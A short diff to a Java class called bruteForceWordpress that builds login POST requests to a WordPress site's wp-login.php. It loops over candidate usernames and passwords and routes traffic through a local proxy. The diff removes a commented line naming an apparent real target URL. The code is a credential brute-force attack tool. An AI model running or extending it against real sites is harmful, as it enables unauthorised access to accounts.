@@ -29,8 +29,7 @@ public class bruteForceWordpress implements Runnable {
                 URL url = new URL(host + "/wp-login.php");
                 Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8080));
                 HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                //log=admin&pwd=admin&wp-submit=Log+In&redirect_to=https%3A%2F%2Fexchtest.nagios.org%2Fwp-admin%2F&testcookie=1
-                //String urlParameters = String.format("log=%s&pwd=%s&wp-submit=Log+In&redirect_to=%s%2Fwp-admin%2F&testcookie=1", users, password, host);
+              
                 String urlParameters = "log=" + users + "&pwd=" + password + "&wp-submit=Log+In&redirect_to=http%3A%2F%2F" + host + "%2Fwp-admin%2F&testcookie=1";
                 byte[] postData = urlParameters.getBytes(StandardCharsets.UTF_8);
                 int postDataLength = postData.length;
